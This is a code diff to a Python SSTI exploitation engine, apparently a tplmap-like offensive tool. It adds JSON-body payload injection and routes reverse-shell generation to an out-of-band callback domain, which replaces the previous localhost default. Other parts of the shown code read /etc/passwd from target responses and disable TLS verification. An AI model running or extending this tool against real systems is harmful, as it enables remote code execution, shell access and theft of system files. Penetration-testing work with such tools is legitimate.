@@ -25,6 +25,9 @@ from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
+from core.var import USER_AGENTS
+
 # ============================================================================
 # ANSI COLOR CODES
 # ============================================================================
@@ -419,13 +422,7 @@ class TPLmapEngine:
 
     def __init__(self, session=None, timeout=10, retries=2, threads=5,
                  delay=0, verbose=True, proxy=None):
-        self.session = session or requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = session or shared_session
         self.timeout = timeout
         self.retries = retries
         self.threads = threads
@@ -503,6 +500,11 @@ class TPLmapEngine:
             return self._make_request(url, 'GET', params={param_name: payload})
         elif inject_type == 'post':
             return self._make_request(url, 'POST', data={param_name: payload})
+        elif inject_type == 'json':
+            injection = PayloadInjector.inject_json(url, param_name, payload)
+            return self._make_request(injection['url'], injection['method'],
+                                     json=injection['json'],
+                                     headers=injection.get('headers', {}))
         elif inject_type == 'header':
             return self._make_request(url, 'GET', headers={param_name: payload})
         elif inject_type == 'cookie':
@@ -708,8 +710,9 @@ class TPLmapEngine:
         """Detect template engine from error messages"""
         for engine_name, engine_data in TEMPLATE_ENGINES.items():
             for pattern in engine_data.get('error_patterns', []):
-                if re.search(pattern, text, re.IGNORECASE):
+                if regex_cache.search(pattern, text, re.IGNORECASE):
                     return engine_name
+
         return None
 
     # ========================================================================
@@ -761,7 +764,7 @@ class TPLmapEngine:
 
                     # Check for error patterns
                     for pattern in engine_data.get('error_patterns', []):
-                        if re.search(pattern, resp.text, re.IGNORECASE):
+                        if regex_cache.search(pattern, resp.text, re.IGNORECASE):
                             score += 15
                             evidence.append(f'Error pattern match: {pattern}')
 
@@ -1125,7 +1128,7 @@ class TPLmapEngine:
     # generate_reverse_shell
     # ========================================================================
 
-    def generate_reverse_shell(self, url, param=None, host='127.0.0.1', port=4444, engine=None):
+    def generate_reverse_shell(self, url, param=None, host=None, port=4444, engine=None):
         """
         Generate reverse shell via SSTI.
         """
@@ -1135,6 +1138,12 @@ class TPLmapEngine:
 
         if engine not in TEMPLATE_ENGINES:
             return {'vulnerable': False, 'findings': [], 'details': {'error': f'Unknown engine: {engine}'}, 'scan_type': 'ssti_reverse_shell'}
+
+        # Use oob_provider for callback host if not explicitly provided
+        if host is None:
+            oob_pid = oob_provider.generate_payload_id()
+            oob_domain = oob_provider.get_callback_domain(oob_pid)
+            host = oob_domain
 
         self._log(f"Generating reverse shell via {engine} SSTI -> {host}:{port}", "info")
         results = {
@@ -1193,7 +1202,7 @@ class TPLmapEngine:
             r'(total\s+\d+\n?[drwx-]{10})',
         ]
         for pattern in patterns:
-            match = re.search(pattern, text)
+            match = regex_cache.search(pattern, text)
             if match:
                 return match.group(0)
         return None
@@ -1201,7 +1210,7 @@ class TPLmapEngine:
     def _extract_file_content(self, text, file_path):
         """Extract file content from response text"""
         if '/etc/passwd' in file_path:
-            match = re.search(r'(root:x:0:0:[^\n]*\n(?:[^\n]*:\d+:\d+:[^\n]*\n?)*)', text)
+            match = regex_cache.search(r'(root:x:0:0:[^\n]*\n(?:[^\n]*:\d+:\d+:[^\n]*\n?)*)', text)
             if match:
                 return match.group(0)
         # Generic: look for multi-line content that doesn't look like HTML
@@ -1253,7 +1262,7 @@ def run(target, scan_type='detect', **kwargs):
     elif scan_type == 'blind_detect':
         return engine.blind_ssti_detect(target, param=param)
     elif scan_type == 'reverse_shell':
-        return engine.generate_reverse_shell(target, param=param, host=kwargs.get('host', '127.0.0.1'), port=kwargs.get('port', 4444), engine=kwargs.get('engine'))
+        return engine.generate_reverse_shell(target, param=param, host=kwargs.get('host', None), port=kwargs.get('port', 4444), engine=kwargs.get('engine'))
     else:
         # Default: run full detection
         result = engine.detect_ssti(target, param=param)
